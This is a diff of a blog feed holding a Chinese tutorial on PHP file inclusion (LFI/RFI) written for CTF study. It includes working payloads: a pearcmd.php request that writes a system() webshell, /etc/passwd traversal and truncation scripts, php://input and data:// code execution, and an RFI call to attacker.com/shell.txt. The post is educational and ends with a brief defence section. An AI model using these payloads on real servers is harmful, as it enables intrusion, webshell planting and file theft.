-<h4 id="pearcmd-php-可能的路径"><a href="#pearcmd-php-可能的路径" class="headerlink" title="pearcmd.php 可能的路径"></a><code>pearcmd.php</code> 可能的路径</h4><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/php/pearcmd.php</span><br><span class="line">/usr/local/lib/php/pearcmd.php</span><br><span class="line">/var/www/html/pear/pearcmd.php</span><br></pre></td></tr></table></figure>
-
-<h5 id="Windows（XAMPP）"><a href="#Windows（XAMPP）" class="headerlink" title="Windows（XAMPP）"></a>Windows（XAMPP）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\xampp\php\PEAR\pearcmd.php</span><br></pre></td></tr></table></figure>
-
-<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><h6 id="直接包含-pearcmd-php-进行-RCE"><a href="#直接包含-pearcmd-php-进行-RCE" class="headerlink" title="直接包含 pearcmd.php 进行 RCE"></a>直接包含 <code>pearcmd.php</code> 进行 RCE</h6><p>如果服务器有 LFI 漏洞，可以直接访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php</span><br></pre></td></tr></table></figure>
-
-<p>然后使用 <code>+config-create+</code> 写入 Webshell：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-create+/var/www/html+&lt;?=system($_GET[&#x27;cmd&#x27;]);?&gt;+.php</span><br></pre></td></tr></table></figure>
-
-<p><strong>这将在 <code>/var/www/html/.php</code> 生成 Webshell</strong>，然后访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/.php?cmd=id</span><br></pre></td></tr></table></figure>
-
-<p>即可执行系统命令</p>
-<h6 id="结合-php-input-进行代码执行"><a href="#结合-php-input-进行代码执行" class="headerlink" title="结合 php://input 进行代码执行"></a>结合 <code>php://input</code> 进行代码执行</h6><p>如果服务器 <code>allow_url_include=On</code>，可以：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=php://input</span><br></pre></td></tr></table></figure>
-
-<p>然后用 <code>POST</code> 发送：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果 <code>pearcmd.php</code> 存在，也可以利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-show</span><br></pre></td></tr></table></figure>
-
-<p>这样 <code>pearcmd.php</code> 可能会解析 <strong>session</strong> 或 <strong>临时文件</strong>，执行恶意代码</p>
-<h6 id="结合-session-auto-start-进行代码执行"><a href="#结合-session-auto-start-进行代码执行" class="headerlink" title="结合 session.auto_start 进行代码执行"></a>结合 <code>session.auto_start</code> 进行代码执行</h6><p>如果 <code>session.auto_start=1</code>，可以将恶意代码写入 <code>$_SESSION</code>，然后通过 <code>pearcmd.php</code> 解析：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;payload&#x27;] = &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-show</span><br></pre></td></tr></table></figure>
-
-<p>可能会解析 <code>$_SESSION</code> 并执行 <code>payload</code> 代码</p>
-<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p><code>../</code>可以进行目录遍历</p>
-<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有时把点号过滤了，尝试编码点号</p>
-<h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL格式在此处具有妙用，可以在payload最后加**<code>?</code>或者<code>#（url编码为%23）</code>，或者空格绕过%20**</p>
-<h4 id="使用协议"><a href="#使用协议" class="headerlink" title="使用协议"></a>使用协议</h4><p>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;都可以</p>
-<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件： php版本 &lt; php 5.2.8</p>
-<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
-<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://target.com/index.php?file=&quot;</span><br><span class="line"></span><br><span class="line"># 目标文件</span><br><span class="line">payload = &quot;../../../../../../etc/passwd&quot;</span><br><span class="line"></span><br><span class="line"># 生成超长路径（超过服务器限制）</span><br><span class="line">long_truncation = payload + &quot;A&quot; * 4000  # 让路径超长</span><br><span class="line"></span><br><span class="line"># 发送请求</span><br><span class="line">response = requests.get(url + long_truncation)</span><br><span class="line"></span><br><span class="line"># 检查是否成功</span><br><span class="line">if &quot;root:&quot; in response.text:</span><br><span class="line">    print(&quot;[+] 成功绕过，已读取 /etc/passwd&quot;)</span><br><span class="line">    print(response.text)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-] 失败，可能需要调整长度&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><code>/etc/passwd</code> 文件包含 <code>root:</code> 关键字，如果返回 <code>root:x:0:0:</code> 说明读取成功</p>
-<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件： php版本 &lt; php 5.3.4</p>
-<p><code>index.php?file=phpinfo.txt%00</code></p>
-<h3 id="指定前后缀"><a href="#指定前后缀" class="headerlink" title="指定前后缀"></a>指定前后缀</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include &#x27;/var/www/html/&#x27;.$file.&#x27;/test/test.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以使用目录遍历和长度截断（或者0字节截断），有必要的话可以对点号编码，至少协议和URL使用不了</p>
-<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><ul>
-<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<code>open_basedir</code>，则会包含失败</li>
-</ul>
-<p><code>open_basedir</code> 的主要作用是限制 PHP 脚本只能访问指定的目录及其子目录。这样，即使某个脚本存在漏洞，也无法访问超出这些限定目录之外的文件</p>
-<ul>
-<li>做好文件的权限管理</li>
-<li>对危险字符进行过滤等等</li>
-</ul>
-</div>]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>漏洞</tag>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -2687,6 +2392,301 @@
       </tags>
   </entry>
   <entry>
+    <title>PHP文件包含漏洞</title>
+    <url>/2025/02/17/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种<strong>注入型漏洞</strong>，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行</p>
+<p>“包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
+<p>攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>include， require<br>require报错会终止程序，但是include会继续执行下面代码。</p>
+<p>include_once ，require_once<br>包含过的就不会继续包含</p>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI</p>
+<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞，指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大</p>
+<p>RFI对<code>php.ini</code>里的配置有些要求：</p>
+<p><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
+<p><code>allow_url_fopen</code> 允许 PHP 读取远程文件</p>
+<p><code>allow_url_include</code> 则允许 PHP 在代码中包含远程文件</p>
+<p>注：在<code>php.ini</code>中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>如果目标服务器配置允许远程文件包含（<code>allow_url_include=On</code>），可以尝试包含远程文件，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?page=http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器加载了远程文件的内容，说明存在远程文件包含漏洞</p>
+<h2 id="用-etc-passwd来检验漏洞存在"><a href="#用-etc-passwd来检验漏洞存在" class="headerlink" title="用/etc/passwd来检验漏洞存在"></a>用<code>/etc/passwd</code>来检验漏洞存在</h2><p>常见的测试文件包括：</p>
+<ul>
+<li><code>/etc/passwd</code>（Linux系统用户信息）</li>
+<li><code>/etc/hosts</code>（主机名配置）</li>
+<li><code>/proc/self/environ</code>（环境变量）</li>
+<li>Apache&#x2F;Nginx日志文件（如<code>/var/log/apache2/access.log</code>）</li>
+</ul>
+<p><code>/etc/passwd</code> 文件包含 <code>root:</code> 关键字，如果返回 <code>root:x:0:0:</code> 说明读取成功</p>
+<h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p><code>http://target.com/index.php?file=../../../../../../etc/passwd</code></p>
+<p>也可用python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://target.com/index.php?file=&quot;</span><br><span class="line"></span><br><span class="line"># 常见的 LFI 路径遍历</span><br><span class="line">payloads = [</span><br><span class="line">    &quot;../../../../../../etc/passwd&quot;,</span><br><span class="line">    &quot;..//..//..//..//..//..//etc/passwd&quot;,  # 双斜杠绕过</span><br><span class="line">    &quot;....//....//....//....//etc/passwd&quot;,  # 多点斜杠绕过</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 发送请求</span><br><span class="line">for payload in payloads:</span><br><span class="line">    full_url = url + payload</span><br><span class="line">    response = requests.get(full_url)</span><br><span class="line"></span><br><span class="line">    if &quot;root:x:0:0:&quot; in response.text:</span><br><span class="line">        print(f&quot;[+] 成功！LFI 存在: &#123;full_url&#125;&quot;)</span><br><span class="line">        print(response.text[:200])  # 仅显示部分内容</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[-] 失败: &#123;full_url&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-php-filter-进行-Base64-编码"><a href="#利用-php-filter-进行-Base64-编码" class="headerlink" title="利用 php://filter 进行 Base64 编码"></a>利用 <code>php://filter</code> 进行 Base64 编码</h3><p><code>http://target.com/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</code></p>
+<h3 id="Null-Byte-截断（PHP"><a href="#Null-Byte-截断（PHP" class="headerlink" title="Null Byte 截断（PHP &lt;5.3.4）"></a><code>Null Byte</code> 截断（PHP &lt;5.3.4）</h3><p>如果服务器强制 <code>.php</code> 后缀：</p>
+<p><code>http://target.com/index.php?file=../../../../../etc/passwd%00</code></p>
+<h3 id="PATH-INFO-截断"><a href="#PATH-INFO-截断" class="headerlink" title="PATH_INFO 截断"></a><strong><code>PATH_INFO</code> 截断</strong></h3><p><code>http://target.com/index.php?file=../../../../../../etc/passwd....................</code></p>
+<h2 id="包含方法"><a href="#包含方法" class="headerlink" title="包含方法"></a>包含方法</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流(I/O streams)</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据(RFC 2397)</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>访问本地文件系统，若不加协议名称，<strong>默认封装协议</strong>为<code>file://</code>协议</p>
+<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul>
+<li><code>allow_url_fopen:off/on</code></li>
+<li><code>allow_url_include :off/on</code></li>
+</ul>
+<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>用于访问本地文件系统（服务器中的文件）</p>
+<p>在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</p>
+<p>注：使用file协议时无法使用相对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=file://flag #用法错误，声明file协议时无法使用相对路径</span><br><span class="line">cmd=file:///flag #用法正确，使用绝对路径</span><br><span class="line">cmd=/flag #用法正确，使用绝对路径</span><br><span class="line">cmd=flag #用法正确，使用相对路径</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Linux</span><br><span class="line">cmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条</span><br><span class="line">cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件</span><br><span class="line">cmd=flag #当前目录下的flag文件</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">cmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=file://C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=flag  #当前文件夹下flag文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h4><p>访问 HTTP(s) 网址</p>
+<h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><ul>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include:on</li>
+</ul>
+<h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含</strong></p>
+<h5 id="使用实例-1"><a href="#使用实例-1" class="headerlink" title="使用实例"></a>使用实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=http://example.com/phpinfo.txt	#读取http://example.com/phpinfo.txt文件</span><br><span class="line">cmd=https://example.com/file.php?var1=val1&amp;var2=val2	#读取https://example.com/file.php文件并且传入var1和var2的值</span><br></pre></td></tr></table></figure>
+
+<h4 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h4><p>访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p>
+<h5 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。</span><br><span class="line">php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。</span><br><span class="line">php://stdin #用于访问标准输入流。</span><br><span class="line">php://stdout #用于访问标准输出流。</span><br><span class="line">php://stderr #用于访问标准错误输出流。</span><br><span class="line">php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。</span><br><span class="line">php://memory #用于在内存中创建可读写的数据流。</span><br><span class="line">php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。</span><br><span class="line">php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。</span><br><span class="line">php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。</span><br></pre></td></tr></table></figure>
+
+<p>在CTF中经常使用的是**<code>php://filter</code><strong>和</strong><code>php://input</code>**、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码</p>
+<h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
+<li><code>allow_url_fopen:off/on</code></li>
+<li><code>allow_url_include</code> :仅<code>php://input</code> 、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要on</li>
+</ul>
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><h6 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h6><ul>
+<li><code>allow_url_fopen:off/on</code></li>
+<li><code>allow_url_include :on</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET[URL部分]</span><br><span class="line">?file=php://input</span><br><span class="line"></span><br><span class="line">POST[POST DATA部分]</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h6><p>主要用来接收<strong>post</strong>数据</p>
+<p>CTF中文件包含题目里，可以使用<code>php://input</code>协议，将post请求中的数据作为php代码执行</p>
+<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h5><h6 id="条件-4"><a href="#条件-4" class="headerlink" title="条件"></a>条件</h6><ul>
+<li><code>allow_url_fopen:off/on</code></li>
+<li><code>allow_url_include :off/on</code></li>
+</ul>
+<h6 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h6><p>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理（即读取或写入数据之前对其进行修改或过滤）</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须的。它指定了你要筛选过滤的数据流。（<strong>加绝对路径</strong>）</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
+<td>read参数指定 一个或多个过滤器 用于<strong>读</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出）</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
+<td>write参数指定 一个或多个过滤器 用于<strong>写</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件）</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表<strong>会视情况应用于读或写链</strong>。</td>
+</tr>
+</tbody></table>
+<p>注：</p>
+<ul>
+<li><code>read</code> 和 <code>write</code> 指令是互斥的，不能同时使用。</li>
+<li>如果存在多个过滤器，字符串从左到右的顺序经过过滤器</li>
+</ul>
+<h6 id="常用过滤语句"><a href="#常用过滤语句" class="headerlink" title="常用过滤语句"></a>常用过滤语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码</span><br></pre></td></tr></table></figure>
+
+<h6 id="常用过滤器-未完"><a href="#常用过滤器-未完" class="headerlink" title="常用过滤器(未完)"></a>常用过滤器(未完)</h6><p>字符串过滤器</p>
+<p><a href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p>
+<ul>
+<li><code>string.rot13</code>（对字符串执行<code>ROT13</code>编码转换）</li>
+<li><code>string.toupper</code>（将字符串转化为大写）</li>
+<li><code>string.tolower</code>（将字符串转化为小写）</li>
+<li><code>string.strip_tags</code>(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记)</li>
+</ul>
+<p>转换过滤器</p>
+<p><a href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p>
+<p>注：转换过滤器是 PHP 5.0.0 添加的</p>
+<ul>
+<li><p><strong>常用</strong>：**<code>convert.base64-encode</code><strong>和</strong><code>convert.base64-decode</code>**（将字符串进行base64编码加解密）</p>
+</li>
+<li><p><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code>（将字符串进行Quoted-printable编码加解密）</p>
+</li>
+<li><p><code>convert.iconv.*</code>（将字符串进行字符编码转化）</p>
+</li>
+</ul>
+<blockquote>
+<p><strong>Quoted-Printable（QP）编码</strong> 是一种 <strong>可读性较高的7位编码</strong>，用于安全传输包含 <strong>特殊字符</strong>（如非 ASCII 字符）的文本，尤其是在 <strong>电子邮件（MIME）</strong> 中。它的主要目的是在 <strong>兼容 7-bit 传输协议</strong>（如 SMTP）的同时，保持尽可能的可读性</p>
+<p>编码规则：</p>
+<p><strong>ASCII 可打印字符（33-126）</strong> 直接保留，如 <code>abcXYZ123</code></p>
+<p><strong>空格和制表符（TAB）</strong></p>
+<ul>
+<li>末尾空格必须用 <code>=20</code> 表示（防止邮件客户端自动去掉）</li>
+</ul>
+<p><strong>不可打印字符（0-31, 127-255）</strong>，使用 <code>=XX</code> 形式编码，其中 <code>XX</code> 是 <strong>两位十六进制表示</strong></p>
+<p><strong>换行符（CRLF, <code>\r\n</code>）</strong></p>
+<ul>
+<li>QP 默认使用 <code>\r\n</code> 作为换行符</li>
+<li>长于 <strong>76 个字符</strong> 的行必须 <strong>换行</strong>，并在行尾加 <code>=</code> 作为软换行</li>
+</ul>
+</blockquote>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>php版本大于等于php5.3.0<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><code>phar://</code> 是用来解压的伪协议</p>
+<p><code>phar://</code>不管参数中是什么拓展名，都会被当做压缩包</p>
+<h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><p><code>?file=phar://压缩包/压缩文件</code></p>
+<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><code>phar://xxx.png/shell.php</code></p>
+<p>写一个木马文件<code>shell.php</code>，然后用<code>zip://</code>伪协议压缩成<code>shell.zip</code>，最后修改后缀名为<code>.png</code>，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p>
+<p>这样<code>phar://</code>就会将png当做zip压缩包进行解压，并且访问解压后的<code>shell.php</code>文件</p>
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><p>php版本大于等于php5.3.0<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
+<p>和<code>phar://</code>伪协议原理类似，但用法不同</p>
+<h5 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h5><p><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
+<p>注意：需要将#转换成URL编码：<code>%23</code></p>
+<p> <code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，<strong>更重要的是不需要指定后缀名，可修改为任意后缀</strong>：jpg、png、gif等等。</p>
+<p><strong>注</strong>：<code>zlib://</code> 需要是服务器内的压缩包文件、但不局限于后缀名</p>
+<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><p>1.<code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.zip</code> ，压缩包重命名为 <code>phpinfo.jpg</code> ，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>2.<code>compress.bzip2://file.bz2</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.bz2</code> 并上传(同样支持任意后缀名)，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.bzip2:///var/www/html/phpinfo.bz2</span><br></pre></td></tr></table></figure>
+
+<p>3.<code>compress.zlib://file.gz</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.gz</code> 并上传(同样支持任意后缀名)，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib:///var/www/html/phpinfo.gz</span><br></pre></td></tr></table></figure>
+
+<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><h5 id="条件-5"><a href="#条件-5" class="headerlink" title="条件"></a>条件</h5><p>php版本大于等于php5.2<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
+<h5 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h5><ul>
+<li><code>data://text/plain,[加上所需传输的经过url编码数据]</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<p>注：加号 + 的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8%2b</code>的base64解码为： <code>&lt;?php phpinfo();?&gt;</code></p>
+<h4 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h4><p>PHP要安装<code>expect</code>扩展</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?file=php:expect://id</span><br><span class="line">http://example.com/index.php?file=php:expect://ls</span><br></pre></td></tr></table></figure>
+
+<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p><a href="https://www.jianshu.com/p/e6f59f3f01b8">Session文件包含漏洞-简书</a></p>
+<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>session文件路径已知，且其中内容部分可控</p>
+<p><strong>过滤了点</strong>之后不能使用文件包含来getshell了，能利用无后缀的文件session，利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p>
+<h4 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="一些配置选项"><a href="#一些配置选项" class="headerlink" title="一些配置选项"></a>一些配置选项</h5><p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p>
